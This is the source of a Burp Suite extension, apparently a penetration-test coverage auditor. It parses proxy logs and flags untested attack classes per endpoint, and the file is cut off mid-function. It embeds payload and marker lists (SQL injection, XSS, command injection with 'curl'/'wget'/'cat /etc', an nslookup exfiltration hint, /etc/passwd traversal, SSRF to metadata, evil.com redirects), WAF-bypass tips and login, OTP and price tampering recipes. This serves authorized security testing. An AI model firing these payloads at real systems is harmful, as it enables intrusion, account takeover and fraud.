# -*- coding: utf-8 -*-
"""
CoverMap - Burp Suite Extension (Jython 2.7)

Self-contained port of covermap.py as a Burp Suite extension.
Adds a "CoverMap" tab with:
  - Scope text field (in-scope host(s), comma separated)
  - Engagement name
  - Upload CSV (Burp default Logger CSV)
  - Upload JSON (Logger++ JSON)
  - Output formats (HTML / JSON / TXT / Markdown)
  - Output base directory (auto-named from scope + timestamp)
  - Run / Generate button
  - Live log area

Load in Burp:
  Extensions -> Installed -> Add -> Extension type: Python -> select this file
  (Burp must have Jython 2.7 standalone JAR configured.)

Authorized testing only.
"""

from __future__ import print_function
import sys
import os
import re
import json
import csv
import base64
import hashlib
import traceback
from datetime import datetime
from collections import defaultdict

try:
    from urllib.parse import urlparse, parse_qs, unquote, unquote_plus
except ImportError:
    from urlparse import urlparse, parse_qs
    from urllib import unquote, unquote_plus

try:
    from burp import IBurpExtender, ITab
    from javax.swing import (
        JPanel, JButton, JTextField, JLabel, JTextArea, JScrollPane,
        JFileChooser, JCheckBox, JOptionPane, BorderFactory,
        SwingUtilities, JSplitPane, BoxLayout, Box
    )
    from javax.swing.filechooser import FileNameExtensionFilter
    from java.awt import (
        BorderLayout, GridBagLayout, GridBagConstraints, Insets,
        Font, Dimension, Color, FlowLayout
    )
    from java.io import File
    from java.lang import Thread, Runnable
    BURP_AVAILABLE = True
except ImportError:
    BURP_AVAILABLE = False

try:
    csv.field_size_limit(sys.maxsize)
except (OverflowError, AttributeError):
    try:
        csv.field_size_limit(2 ** 31 - 1)
    except Exception:
        pass


def _u(v):
    """Coerce any value to a text (unicode) string WITHOUT the ascii-encode
    crash Jython 2.7 throws on str(u'non-ascii').

    Burp's default CSV base64-encodes the Request column; decoding it yields
    unicode, so parameter values are unicode. Calling Py2 str() on a unicode
    value with non-ASCII bytes raises UnicodeEncodeError. This helper is used
    everywhere a value/parameter-name is turned into a string for matching,
    formatting or comparison. Bytes are UTF-8 decoded (replace on error)."""
    if v is None:
        return u''
    if isinstance(v, bytes):            # Py2: str is bytes; Py3: real bytes
        try:
            return v.decode('utf-8', 'replace')
        except Exception:
            try:
                return v.decode('latin-1', 'replace')
            except Exception:
                return u''
    try:
        return unicode(v)               # Py2/Jython text type
    except NameError:
        return str(v)                   # Py3


def _join_clean(items, sep=', ', limit=None):
    """Readable comma list of values/param-names for report 'Evidence' fields -
    avoids the ugly Python repr (`[u'x', u'y']`) and is unicode-safe."""
    seq = list(items)
    if limit is not None:
        seq = seq[:limit]
    return sep.join(_u(x) for x in seq)


# ============================================================
# CONSTANTS - ported from covermap.py
# ============================================================

AUTH_HEADERS = set([
    'authorization', 'x-auth-token', 'x-api-key', 'cookie',
    'x-access-token', 'token', 'bearer', 'x-jwt-token', 'api-key',
])
STATIC_EXTENSIONS = set([
    '.js', '.css', '.png', '.jpg', '.jpeg', '.gif',
    '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot', '.map',
])
DEFAULT_NOISE_PATHS = set([
    '/_incapsula_resource', '/_imperva', '/__cf', '/cdn-cgi/',
    '/akam/', '/akamai', '/_bm/', '/fbevents', '/collect',
    '/gtag/', '/google-analytics', '/analytics.', '/telemetry',
    '/beacon', '/__utm', '/pixel', '/recaptcha',
])
SECURITY_HEADERS = set([
    'x-forwarded-for', 'x-real-ip', 'x-forwarded-host',
    'x-original-url', 'host', 'origin', 'referer',
    'x-http-method-override', 'x-custom-ip-authorization',
])

IDOR_PARAM = re.compile(
    r'\b(id|user_?id|account_?id|customer_?id|order_?id|doc_?id|file_?id|'
    r'uid|uuid|guid|handle|ref|reference|record|item|object|resource)\b', re.I)
TRAVERSAL_PARAM = re.compile(
    r'\b(file|path|dir|directory|folder|location|url|uri|src|source|'
    r'dest|destination|target|redirect|return|next|back|download|upload|'
    r'template|page|include|load|fetch|retrieve)\b', re.I)
INJECTION_PARAM = re.compile(
    r'\b(query|search|q|filter|sort|order|where|condition|keyword|term|'
    r'input|data|value|param|field|column|table|name|key)\b', re.I)
PRIVILEGE_PARAM = re.compile(
    r'\b(role|permission|access|level|type|group|admin|privilege|scope|'
    r'capability|auth|right|grant|tier|plan)\b', re.I)
SSRF_PARAM = re.compile(
    r'\b(url|uri|endpoint|host|server|domain|callback|webhook|proxy|'
    r'remote|fetch|load|import|link|href|src|feed|site|page_?url|image_?url|'
    r'dest|to|out|target|forward|continue|data_?url|api|service)\b', re.I)
SENSITIVE_PATH = re.compile(
    r'/(admin|manage|management|internal|private|config|configuration|'
    r'setup|install|debug|test|dev|staging|backup|export|import|upload|'
    r'download|report|audit|log|logs|monitor|health|metrics|status|'
    r'actuator|swagger|api-docs|graphql|rpc)', re.I)

XSS_PARAM = re.compile(
    r'\b(q|s|search|query|term|keyword|name|title|subject|message|msg|comment|'
    r'content|body|text|desc|description|bio|review|feedback|note|input|data|'
    r'value|callback|redirect|return|lang|locale|page|tab|view|ref|referrer|'
    r'firstname|lastname|fullname|address|city|company|label|caption|alt)\b', re.I)
CMD_PARAM = re.compile(
    r'\b(cmd|command|exec|execute|ping|host|ip|ipaddr|addr|domain|dns|run|'
    r'system|os|shell|action|func|function|process|task|job|script|tool|util|'
    r'nslookup|traceroute|jvm|bin|path|file|name|email)\b', re.I)
SSTI_PARAM = re.compile(
    r'\b(name|template|tpl|page|view|theme|layout|content|message|msg|subject|'
    r'title|greeting|preview|render|format|lang|locale|email|firstname|fullname)\b', re.I)
OPEN_REDIRECT_PARAM = re.compile(
    r'\b(redirect|redir|url|uri|return|returnurl|return_url|returnto|return_to|'
    r'next|goto|dest|destination|continue|callback|target|forward|out|view|to|'
    r'link|checkout|page|r|u|rurl|returnpath|origin|ref|relaystate|service)\b', re.I)
LDAP_PARAM = re.compile(
    r'\b(user|username|uid|cn|dn|sn|search|group|ou|memberof|account|login|mail)\b', re.I)
CRLF_PARAM = re.compile(
    r'\b(url|redirect|return|next|location|lang|locale|cookie|header|host|'
    r'callback|page|file|name|value|q|search|ref|referer)\b', re.I)
EMAIL_PARAM = re.compile(
    r'\b(email|e_?mail|mail|to|recipient|sender|from|cc|bcc|username|user|login|userid)\b', re.I)
FILEUPLOAD_PARAM = re.compile(
    r'\b(file|upload|attachment|document|doc|image|img|photo|avatar|picture|'
    r'media|content|import|data|filename|fileupload|userfile)\b', re.I)
PRICE_PARAM = re.compile(
    r'\b(price|amount|cost|total|qty|quantity|count|num|number|discount|coupon|'
    r'promo|voucher|balance|credit|points|cart|sum|fee|tax|currency|wallet|refund)\b', re.I)
WORKFLOW_PARAM = re.compile(
    r'\b(step|stage|state|status|stage_?id|next|prev|phase|flow|wizard|'
    r'complete|confirm|verified|approved|paid|active|enabled|stage_no)\b', re.I)
SENSITIVE_IN_URL = re.compile(
    r'\b(password|passwd|pwd|pass|token|secret|api_?key|apikey|access_?token|'
    r'auth|session|sessionid|jsessionid|ssn|card|cardnumber|cvv|pin|otp)\b', re.I)
MASS_ASSIGN_HINT = re.compile(
    r'\b(is_?admin|isadmin|admin|role|roles|is_?active|active|verified|'
    r'is_?verified|approved|status|permission|permissions|scope|scopes|'
    r'group|grant|privilege|account_?type|user_?type|level|balance|credit)\b', re.I)

# Generic JSON/REST API params (pagination, sorting, projection, locale, etc.).
# Their NAMES match value-shaped sink regexes (TRAVERSAL/OPEN_REDIRECT/SSRF/SSTI/
# file-upload) on substrings like "page", but they are not value sinks unless an
# OBSERVED value actually looks pathish/URL-ish. These names + a benign scalar
# value are gated out of those sink classes (see _benign_scalar_skip /
# _value_shape_gate). NOT gated for SQLi/XSS - those still apply.
BENIGN_PARAM_NAMES = set([
    'per_page', 'page', 'sort', 'fields', 'filters', 'limit', 'offset', 'order',
    'q', 'lang', 'locale', 'view', 'tab', 'format', 'size', 'count', 'start',
    'dir', 'expand',
])

PATH_AUTH = re.compile(r'(login|signin|sign-in|logon|authenticate|auth|sso|oauth|token|session)', re.I)
PATH_RESET = re.compile(r'(reset|forgot|recover|password.?mail|changepass|setpassword)', re.I)
PATH_REGISTER = re.compile(r'(register|signup|sign-up|create.?user|enroll|onboard|userregistration)', re.I)
PATH_LOGOUT = re.compile(r'(logout|signout|sign-out|logoff)', re.I)
PATH_UPLOAD = re.compile(r'(upload|import|attach|file|document|media|avatar|photo|image)', re.I)
PATH_GRAPHQL = re.compile(r'(graphql|graphiql|gql)', re.I)
PATH_API = re.compile(r'(/api/|/rest/|/v\d+/|\.json|/rpc|/jsonrpc|/odata)', re.I)
PATH_ADMIN = re.compile(r'(admin|manage|management|console|dashboard|internal|backoffice|superuser)', re.I)
PATH_OTP = re.compile(r'(otp|2fa|mfa|verify|verification|code|challenge|totp)', re.I)
PATH_EXPORT = re.compile(r'(export|download|report|invoice|statement|backup|dump)', re.I)

WAF_BYPASS = ("WAF bypass: inline comments /*!50000UNION*/, case-toggle uNiOn, "
              "URL/double-URL/unicode/overlong-UTF8 encoding, HTTP param pollution (id=1&id=2), "
              "newline %0a/%0d split, NBSP/zero-width chars, JSON vs form content-type swap, chunked body.")

# Structural parameter-tampering primitives (param removal / empty value / null /
# type confusion / array bind / HPP). These are NOT payload-injection cases;
# they cover "what if the server treats missing/empty/wrong-type as success?".
STRUCTURAL_LOGIN = (
    "Remove `password` field entirely from the request (some backends short-circuit when missing). "
    "Send `password=` (present but empty). JSON `\"password\":null`. Type confusion `\"password\":true`. "
    "Array bind `password[]=` or JSON `\"password\":[]`. Object bind `\"password\":{}`. "
    "Same set against `username`. HPP: `username=admin&username=guest`. "
    "Strip cookie-based CSRF token. Drop the Content-Length and re-send. Submit credentials as JSON to a "
    "form-only endpoint (and vice versa). Try second-factor params blank (`otp=`, `code=`)."
)
STRUCTURAL_RESET = (
    "Remove `token`/`code` parameter entirely. Send empty value. Send `token=null`, `token=true`, `token=[]`. "
    "Remove `email`/`username` to see if the reset proceeds anonymously. "
    "Submit reset for target's email with a missing or empty token. "
    "Submit your own valid token against the victim's email (token-vs-email decoupling). "
    "Replay the password-set step without first hitting the verify step (skip the state machine)."
)
STRUCTURAL_OTP = (
    "Remove `code`/`otp` parameter entirely. Send empty (`otp=`). Send `otp=null`, `otp=true`, `otp=0`, `otp=[]`. "
    "Object form `\"otp\":{\"$ne\":null}` (NoSQL). Submit alongside `backup_code=` blank. "
    "Re-submit the previous successful verify body verbatim (replay). "
    "Race the verify endpoint with 20-50 parallel requests using one valid code (counter race). "
    "Skip the verify step entirely and hit the post-verify route directly."
)
STRUCTURAL_REGISTER = (
    "Remove `password`/`email`/captcha-token. Send empty. Array variants (`email[]=a&email[]=b`). "
    "Inject privilege fields the form does not show: `role=admin`, `is_admin=true`, `verified=true`, "
    "`email_verified=true`, `tier=premium`, `balance=999999`. "
    "Register an existing email with a blank password (account-overwrite takeover). "
    "Skip the email-verification step by hitting the post-verify endpoint directly."
)
STRUCTURAL_PRICE = (
    "Remove `price`/`amount`/`total` parameter entirely (server may fall through to a 0 default). "
    "Send empty (`amount=`). Send `amount=null`. Negative (`amount=-1`, `qty=-1`). Zero. "
    "Decimal underflow (`0.001`, `0.0001`). Huge int / scientific (`1e308`, `99999999999`). "
    "Array (`amount[]=1&amount[]=99999`) - last vs first wins. "
    "Currency confusion: swap currency code to a lower-value currency keeping the numeric amount. "
    "Coupon stacking: apply the same one-time coupon in 20 parallel requests. "
    "Refund/withdraw race: fire the same action concurrently to double-spend."
)
STRUCTURAL_LOGOUT = (
    "Re-use the session cookie immediately after logout (server-side invalidation check). "
    "Logout via GET if only POST is exposed (CSRF). "
    "Verify session ID rotates on login (fixation). "
    "Test logout with a different user's cookie (cross-session logout / DoS)."
)

SCORE_BANDS = [
    (range(0, 20),   'NO COVERAGE'),
    (range(20, 40),  'POOR'),
    (range(40, 60),  'PARTIAL'),
    (range(60, 80),  'MODERATE'),
    (range(80, 95),  'ADEQUATE'),
    (range(95, 101), 'THOROUGH'),
]
SEVERITY_EMOJI = {'CRITICAL': 'CRIT', 'HIGH': 'HIGH', 'MEDIUM': 'MED', 'LOW': 'LOW'}

FRAMEWORK_PARAMS = set([
    '__viewstate', '__viewstategenerator', '__viewstateencrypted',
    '__eventvalidation', '__eventtarget', '__eventargument', '__previouspage',
    '__async', '__lastfocus', '__scrollpositionx', '__scrollpositiony',
    '__requestverificationtoken', 'csrfmiddlewaretoken', 'authenticity_token',
    '_csrf', 'csrf_token', 'csrftoken',
    # Synthetic markers injected by the XML body parser (not real app inputs;
    # consumed only by the XXE heuristic).
    '__xml_doctype__', '__xml_entity__',
])

PARAM_ATTACK_MATRIX = [
    ('SQLi',         ("'", '"', '--', '/*', '*/', '#', 'or 1=1', 'or 1=2', 'and 1=1', 'and 1=2',
                      "' or '", "' and '", '" or "', '" and "', 'union select', 'union all',
                      'order by', 'group by', 'having ', 'sleep(', 'pg_sleep', 'benchmark(',
                      'waitfor delay', 'dbms_pipe', 'extractvalue(', 'updatexml(',
                      'information_schema', '@@version', '0x', "')", '")', '||', 'rlike', 'regexp '),
     "' OR '1'='1'-- - | 1' AND SLEEP(5)-- - | ' UNION SELECT NULL-- - | error: ' \" )"),
    ('NoSQL',        ('{$', '[$', '$ne', '$gt', '$lt', '$gte', '$lte', '$regex', '$where', '$in', '.find(', '||1==1'),
     '{"$ne":null} | [$gt]= | param[$regex]=.*'),
    ('XSS',          ('<script', '</script', 'onerror', 'onload', 'onmouseover', 'onfocus', 'onclick',
                      'javascript:', '<img', '<svg', '<iframe', '<body', '<details', 'alert(',
                      'prompt(', 'confirm(', 'document.cookie', 'eval(', '<%2fscript'),
     '"><svg onload=alert(1)> | \' autofocus onfocus=alert(1) | stored: submit then view render'),
    ('SSTI',         ('{{', '${', '#{', '<%=', '{%', '{{7*7}}', '${7*7}', '#{7*7}', '*{', '@{'),
     '${7*7} {{7*7}} #{7*7} <%=7*7%> -> 49 = template RCE'),
    ('CmdInj',       (';id', '|id', '| id', '&&', '||', '$(', '`', '`id`', '%0a', '%0d', 'sleep ',
                      ';sleep', '|sleep', '& ', '&whoami', ';whoami', 'nslookup', 'ping -', 'ping%20',
                      'curl ', 'wget ', '$(id)', 'cat /etc', 'powershell', 'cmd /c', '/bin/sh', '/bin/bash'),
     ';id | $(id) | %0aid | blind ;sleep 5 | OOB ;nslookup $(whoami).collab'),
    ('Traversal/LFI', ('../', '..\\', '%2e%2e', '..%2f', '..%5c', '....//', '....\\\\', '/etc/passwd',
                       'win.ini', 'boot.ini', 'php://', 'file://', '%00', '/proc/self', 'c:\\windows'),
     '../../../../etc/passwd | ..\\..\\win.ini | %252e | ....// | %00 | php://filter'),
    ('SSRF',         ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', '[::1]', '0x7f', '2130706433',
                      'file://', 'gopher://', 'dict://', 'collab', 'interactsh', 'metadata', 'burpcollaborator',
                      'oastify', '@127.0.0.1', '@localhost'),
     'http://169.254.169.254/latest/meta-data/ | http://localhost/ | file:// | gopher:// | Collaborator'),
    ('OpenRedirect', ('http://', 'https://', '//evil', '/\\', '\\\\', '%2f%2f', '%5c%5c', '@evil', 'https:%2f%2f'),
     '//evil.com | https://trusted@evil.com | /\\evil.com | https:evil.com'),
    ('CRLF/Header',  ('%0d', '%0a', '\r', '\n', '%0d%0a', '\r\n', 'set-cookie:', 'content-length:', '%23%0a'),
     '%0d%0aSet-Cookie:x=1 | %0d%0aLocation:https://evil'),
    ('Overflow/Type', ('-1', '99999', '0x', 'true', 'false', 'null', '[]', '{}', '1e308', '2147483648',
                       '9999999999', "'a'*", 'aaaaaaaaaa'),
     'negative / 0 / huge int / array / object / true|false|null / oversized string'),
]


# ============================================================
# RESPONSE-CONTENT EVIDENCE (constants + regexes)
# ============================================================

# Bounds on captured response data, kept small so a large capture does not
# balloon Burp's JVM heap. Bodies are truncated; only the first N samples per
# endpoint are retained (enough to spot reflection / errors / secrets).
RESP_BODY_TRUNC = 16384      # bytes/chars kept per response body snippet
MAX_RESP_SAMPLES = 10        # response samples retained per endpoint

# Server-side error / stack-trace fingerprints. Presence in a RESPONSE means the
# class was not merely "tested" but produced a concrete signal -> a FINDING, not
# a coverage gap.
SQL_ERROR_RE = re.compile(
    r'(SQL syntax|mysql_fetch|valid MySQL result|com\.mysql\.jdbc|MySqlException|'
    r'ORA-\d{5}|Oracle error|quoted string not properly terminated|'
    r'SQLSTATE\[|PostgreSQL.{0,30}ERROR|PG::\w+Error|psql:|'
    r'Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver|'
    r'Unclosed quotation mark|System\.Data\.SqlClient\.SqlException|'
    r'SQLite/JDBCDriver|SQLiteException|sqlite3\.OperationalError|'
    r'org\.hibernate\.|Npgsql\.)', re.I)
STACK_TRACE_RE = re.compile(
    r'(Traceback \(most recent call last\)|'
    r'at [\w.$]+\([\w.]+\.java:\d+\)|'
    r'System\.[\w.]+Exception|\bStackTrace\b|'
    r'File ".*", line \d+|'
    r'org\.apache\.\w+|javax\.servlet|jakarta\.servlet|'
    r'Warning: \w+\(\)|Fatal error:|Notice: Undefined|'
    r'Microsoft \.NET Framework|ASP\.NET is configured to show)', re.I)
# Sensitive data leaking back in a RESPONSE body -> A02 finding.
JWT_RE = re.compile(r'eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{6,}')
APIKEY_RE = re.compile(
    r'(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|'             # AWS access key
    r'AIza[0-9A-Za-z_\-]{35}|'                          # Google API key
    r'sk_live_[0-9a-zA-Z]{16,}|rk_live_[0-9a-zA-Z]{16,}|'  # Stripe
    r'xox[baprs]-[0-9A-Za-z\-]{10,}|'                   # Slack
    r'gh[pousr]_[0-9A-Za-z]{30,}|'                      # GitHub
    r'-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----)')
PII_RE = re.compile(
    r'(\b\d{3}-\d{2}-\d{4}\b|'                          # US SSN
    r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b)')  # card PANs

# Response headers worth inspecting for misconfiguration.
HTML_CT_RE = re.compile(r'text/html|application/xhtml', re.I)


# ============================================================
# PATH NORMALISATION (auditable module-level rule list)
# ============================================================

# Collection nouns: when one of these is the PREVIOUS path segment, a following
# slug-shaped segment (john-doe, my-product-name) is treated as a variable id so
# /products/blue-widget and /products/red-widget collapse to one endpoint.
COLLECTION_NOUNS = set([
    'users', 'user', 'accounts', 'account', 'customers', 'customer',
    'members', 'member', 'products', 'product', 'items', 'item', 'orders',
    'order', 'posts', 'post', 'articles', 'article', 'comments', 'comment',
    'categories', 'category', 'groups', 'group', 'teams', 'team', 'projects',
    'project', 'files', 'file', 'documents', 'document', 'docs', 'doc',
    'invoices', 'invoice', 'tickets', 'ticket', 'messages', 'message',
    'profiles', 'profile', 'companies', 'company', 'organizations',
    'organization', 'orgs', 'org', 'tags', 'tag', 'pages', 'page', 'blogs',
    'blog', 'events', 'event', 'sessions', 'session', 'tokens', 'token',
    'repos', 'repo', 'repositories', 'channels', 'channel', 'folders', 'folder',
])

_RX_UUID = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
_RX_OBJECTID = re.compile(r'^[0-9a-f]{24}$', re.I)               # Mongo ObjectId
_RX_EMAIL_SEG = re.compile(r'^[^/@\s]+@[^/@\s]+\.[a-z]{2,}$', re.I)
_RX_HEXTOKEN = re.compile(r'^[0-9a-f]{32,}$', re.I)             # md5/sha/hex session ids
_RX_INT = re.compile(r'^\d{2,}$')
_RX_SLUG = re.compile(r'^(?=.{4,})[a-z0-9]+(?:[-_.][a-z0-9]+)+$', re.I)  # has a separator


def _looks_b64_token(seg):
    """Long base64 / base64url-ish token: >=20 chars, mixed alnum (+ optional
    -_=), containing at least one digit AND one letter so dictionary words
    ('documentation', 'administration') are NOT collapsed."""
    if len(seg) < 20 or len(seg) > 256:
        return False
    if not re.match(r'^[A-Za-z0-9_\-]+={0,2}$', seg):
        return False
    has_alpha = bool(re.search(r'[A-Za-z]', seg))
    has_digit = bool(re.search(r'[0-9]', seg))
    has_sep_or_case = ('-' in seg or '_' in seg or '=' in seg or
                       (re.search(r'[a-z]', seg) and re.search(r'[A-Z]', seg)))
    return has_alpha and has_digit and has_sep_or_case


# Ordered, auditable rule list. Each entry: (name, matcher, placeholder).
# matcher is a compiled regex (.match) or a callable predicate. First hit wins.
PATH_SEGMENT_RULES = [
    ('uuid',     _RX_UUID,         '{uuid}'),
    ('objectid', _RX_OBJECTID,     '{objectid}'),
    ('email',    _RX_EMAIL_SEG,    '{email}'),
    ('hextoken', _RX_HEXTOKEN,     '{hextoken}'),
    ('int',      _RX_INT,          '{id}'),
    ('b64token', _looks_b64_token, '{token}'),
]


# ============================================================
# DATA STRUCTURES (Jython 2.7 compatible, no @dataclass)
# ============================================================

class Gap(object):
    def __init__(self, endpoint, category, severity, title, detail,
                 evidence, recommendation, owasp='', kind='coverage', tier=''):
        self.endpoint = endpoint
        self.category = category
        self.severity = severity
        self.title = title
        self.detail = detail
        self.evidence = evidence
        self.recommendation = recommendation
        self.owasp = owasp
        self.kind = kind
        # Finding tier, used ONLY by the HTML report to separate the banner:
        #   'evidence'    -> exploit-evidence (Confirmed Findings, counted in tiles)
        #   'observation' -> header/cookie misconfig (Configuration Observations)
        #   ''            -> coverage/test gap (not a finding)
        self.tier = tier


class EndpointProfile(object):
    def __init__(self, host, path, endpoint_id):
        self.host = host
        self.path = path
        self.endpoint_id = endpoint_id
        self.methods_seen = set()
        self.query_params = {}
        self.body_params = {}
        self.requests_with_auth = 0
        self.requests_without_auth = 0
        self.auth_tokens_seen = set()
        self.headers_modified = set()
        self.status_codes_seen = set()
        self.response_lengths = []
        self.total_requests = 0
        self.behavior_class = 'unknown'
        self.sample_requests = []
        # ── Per-request STRUCTURAL tracking (enables retest intelligence) ──
        # Aggregating param values into sets loses per-request structure, so
        # field-removal, duplicate-key (HPP) and array-binding tests become
        # invisible. These counters preserve that structure so re-running
        # CoverMap after a structural retest reduces the gap.
        self.body_param_presence = {}    # body param name -> # of body-submitting requests containing it
        self.query_param_presence = {}   # query param name -> # of query-bearing requests containing it
        self.body_submit_count = 0       # requests that submitted >=1 body param (form posts)
        self.query_bearing_count = 0     # requests that carried >=1 query param
        self.hpp_params = set()          # params sent with >1 value in a SINGLE request (HPP/array)
        self.array_params = set()        # params whose name uses [] array notation
        self.empty_value_params = set()  # params observed with an empty ('') value
        # ── Burp tool provenance (from the CSV 'Tool' column) ──
        self.tools_seen = set()          # e.g. {'Proxy','Scanner','Repeater','Intruder'}
        self.scanner_hits = 0            # requests issued by Burp Scanner (active audit)
        self.intruder_hits = 0           # requests issued by Burp Intruder (fuzzing)
        # ── Captured RESPONSE evidence (bounded; see RESP_BODY_TRUNC / MAX_RESP_SAMPLES) ──
        self.response_samples = []       # [{'status','len','body','ct'}] truncated bodies
        self.response_headers_seen = {}  # lower-name -> set(observed values)  (misconfig checks)
        self.set_cookies_seen = []       # raw Set-Cookie header strings (bounded)
        self.reflected_values = set()    # tested param values found verbatim in a response body
        # ── Cross-identity object access (IDOR/BOLA evidence) ──
        # identity_fingerprint -> { id_like_param_value -> (best_status, best_len) }
        self.identity_object_access = {}
        # ── GraphQL operation tracking (read from request bodies) ──
        self.graphql_ops = set()         # operationName(s) / first selected field(s) seen
        self.graphql_introspection = False   # was __schema/__type ever requested?
        # ── Per-identity request order / timing (Logger++ Time / RTT columns) ──
        self.request_timeline = []       # [(timestamp_str, method, identity_fp, path_with_qs)]
        self.response_times = []         # numeric round-trip times when the export carries them
        # ── XML body observed (XXE surface) ──
        self.xml_body_seen = False
        self.multipart_seen = False


class EndpointAudit(object):
    def __init__(self, endpoint_id, host, path, behavior_class, total_requests,
                 coverage_score, methods_seen, query_params, body_params,
                 auth_coverage, status_codes, response_length_range,
                 sample_requests, gaps=None):
        self.endpoint_id = endpoint_id
        self.host = host
        self.path = path
        self.behavior_class = behavior_class
        self.total_requests = total_requests
        self.coverage_score = coverage_score
        self.methods_seen = methods_seen
        self.query_params = query_params
        self.body_params = body_params
        self.auth_coverage = auth_coverage
        self.status_codes = status_codes
        self.response_length_range = response_length_range
        self.sample_requests = sample_requests
        self.gaps = gaps or []


# ============================================================
# PARSER
# ============================================================

def parse_loggerpp(filepath, fmt, filter_static=True,
                   scope=None, exclude_paths=None, logger=None, strict=False):
    raw = []
    # Parse-failure accounting. A pentester MUST know what was silently dropped
    # (e.g. a row with a non-int Length), so we count failures and - in strict
    # mode - log the offending row instead of swallowing it.
    stats = {'failures': 0, 'reasons': defaultdict(int)}

    def _record_failure(idx, exc, rowrepr):
        stats['failures'] += 1
        reason = "{0}: {1}".format(type(exc).__name__, exc)
        stats['reasons'][reason] += 1
        if strict and logger:
            logger("  DROPPED row #{0} ({1}): {2}".format(idx, reason, _trunc(rowrepr, 200)))

    if fmt == 'json':
        f = open(filepath, 'rb')
        try:
            raw_bytes = f.read()
        finally:
            f.close()
        try:
            data_text = raw_bytes.decode('utf-8', 'replace')
        except Exception:
            data_text = raw_bytes
        data = json.loads(data_text)
        if isinstance(data, list):
            entries = data
        else:
            entries = data.get('log', data.get('entries', []))
        idx = 0
        for e in entries:
            idx += 1
            try:
                r = _from_json(e)
            except Exception as exc:
                _record_failure(idx, exc, repr(e))
                continue
            if r:
                raw.append(r)
            else:
                _record_failure(idx, ValueError('unrecognised/empty entry'), repr(e))
    else:
        # Read in binary mode; csv module in Py2/Jython prefers byte strings.
        f = open(filepath, 'rb')
        try:
            reader = csv.DictReader(f)
            idx = 0
            for row in reader:
                idx += 1
                try:
                    r = _from_csv(row)
                except Exception as exc:
                    _record_failure(idx, exc, repr(row))
                    continue
                if r:
                    raw.append(r)
                else:
                    _record_failure(idx, ValueError('row missing required fields'), repr(row))
        finally:
            f.close()

    if logger:
        logger("Parsed {0} raw requests".format(len(raw)))
        if stats['failures']:
            logger("  WARNING: dropped {0} row(s) on parse failure{1}".format(
                stats['failures'], "" if strict else " (enable Strict mode to log each)"))
            for reason, cnt in sorted(stats['reasons'].items(), key=lambda kv: -kv[1])[:5]:
                logger("    - {0}x {1}".format(cnt, reason))

    if filter_static:
        before = len(raw)
        raw = [r for r in raw if not any(r['path'].lower().endswith(x) for x in STATIC_EXTENSIONS)]
        if logger and before != len(raw):
            logger("Static-asset filter removed {0} requests".format(before - len(raw)))

    if scope:
        before = len(raw)
        raw = [r for r in raw if _in_scope(r['host'], scope)]
        if logger:
            logger("Scope filter ({0}): kept {1} of {2}".format(", ".join(scope), len(raw), before))

    if exclude_paths:
        before = len(raw)
        raw = [r for r in raw if not _is_noise_path(r['path'], exclude_paths)]
        if logger and before != len(raw):
            logger("Noise-path filter removed {0} requests".format(before - len(raw)))

    return raw


def _is_noise_path(path, patterns):
    p = (path or '').lower()
    for pat in patterns:
        if pat and pat.lower() in p:
            return True
    return False


def _in_scope(host, scope):
    host = (host or '').lower().strip()
    for raw_pat in scope:
        pat = raw_pat.lower().strip()
        if not pat:
            continue
        if pat.startswith('*.'):
            pat = pat[2:]
        if host == pat or host.endswith('.' + pat) or pat in host:
            return True
    return False


def _safe_int(*candidates):
    """First candidate that parses as an int, else 0. A blank/None is skipped;
    a genuinely non-numeric value (e.g. Length='abc') raises so the row is
    surfaced by the parse-failure counter rather than silently zeroed."""
    for c in candidates:
        if c is None or c == '':
            continue
        return int(c)
    return 0


def _from_json(e):
    if isinstance(e.get('Request'), dict):
        req = e['Request']
        resp = e.get('Response') or {}
        url = req.get('URL') or req.get('PathQuery') or req.get('Path', '')
        parsed = urlparse(url)
        return {
            'method':      (req.get('Method') or 'GET').upper(),
            'host':        req.get('Hostname') or req.get('Host', ''),
            'path':        req.get('Path') or parsed.path or '/',
            'query':       parsed.query or urlparse(req.get('PathQuery', '')).query,
            'raw_request': _raw_request_from_loggerpp(req),
            'raw_response': _raw_response_from_loggerpp(resp),
            'status':      _safe_int(resp.get('Status'), 0),
            'resp_len':    _safe_int(resp.get('BodyLength'), resp.get('Length'), 0),
            'tool':        req.get('Tool') or e.get('Tool') or '',
            'timestamp':   e.get('Time') or e.get('Timestamp') or req.get('Time') or '',
            'rtt':         _safe_int(e.get('ResponseTime'), e.get('RTT'),
                                     resp.get('ResponseTime'), 0) or None,
        }

    url = e.get('url') or e.get('URL') or e.get('path', '')
    parsed = urlparse(url)
    return {
        'method':      (e.get('method') or e.get('Method') or 'GET').upper(),
        'host':        e.get('host') or e.get('Host') or e.get('serverHostname', ''),
        'path':        parsed.path or '/',
        'query':       parsed.query,
        'raw_request': e.get('request') or e.get('Request') or '',
        'raw_response': _maybe_b64_response(e.get('response') or e.get('Response') or ''),
        'status':      _safe_int(e.get('responseStatus'), e.get('status'), e.get('Status'), 0),
        'resp_len':    _safe_int(e.get('responseBodyLength'), e.get('responseLength'), e.get('length'), 0),
        'tool':        e.get('tool') or e.get('Tool') or '',
        'timestamp':   e.get('time') or e.get('Time') or e.get('timestamp') or '',
        'rtt':         _safe_int(e.get('responseTime'), e.get('rtt'), 0) or None,
    }


def _raw_request_from_loggerpp(req):
    b64 = req.get('AsBase64')
    if b64:
        try:
            return base64.b64decode(b64).decode('utf-8', 'replace')
        except Exception:
            pass
    headers = req.get('Headers') or ''
    body = req.get('Body') or ''
    line = "{0} {1} HTTP/1.1".format(
        req.get('Method', 'GET'),
        req.get('PathQuery') or req.get('Path', '/'))
    return "{0}\r\n{1}\r\n\r\n{2}".format(line, headers, body)


def _raw_response_from_loggerpp(resp):
    """Reconstruct a raw HTTP response from a Logger++ JSON Response object.
    Prefers AsBase64 (full bytes); falls back to Headers + Body fields."""
    if not isinstance(resp, dict):
        return _u(resp) if resp else ''
